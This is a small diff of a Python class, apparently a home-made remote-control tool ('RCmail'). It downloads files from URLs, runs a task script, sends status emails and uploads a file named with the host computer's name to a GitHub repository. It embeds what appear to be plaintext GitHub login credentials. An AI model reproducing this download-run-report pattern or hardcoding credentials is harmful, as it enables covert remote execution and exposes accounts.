@@ -59,7 +59,7 @@ class RCmail:
 
 
 
-  def My_upload(self,pc_name):
+  def myUpload(self,pc_name):
       g = Github("giorgi1517","zmuki1256")
       name=pc_name+"*"+str(datetime.now().date())+"__"+str(datetime.now().time().hour)+str(datetime.now().time().minute)+".txt"
       repo = g.get_repo("giorgi1517/giorgi1517.github.io")
@@ -98,7 +98,6 @@ class RCmail:
   def myDownload(self,url,path):
       if self.is_downloadable(url)!= True:
          self.send_conf_email("error")
-          #aq chavwero pasuxis failshi chawera da gagzavna
       else:
           r = requests.get(url, allow_redirects=True)
           print(r.headers.get('content-disposition'))
@@ -113,3 +112,5 @@ print(p1.is_downloadable(url))
 print(p1.get_filename_from_url(url))
 print(p1.myDownload(url,""))
 print(p1.myRun("task.py","cmd"))
+print(p1.myUpload(os.environ['COMPUTERNAME']))
+
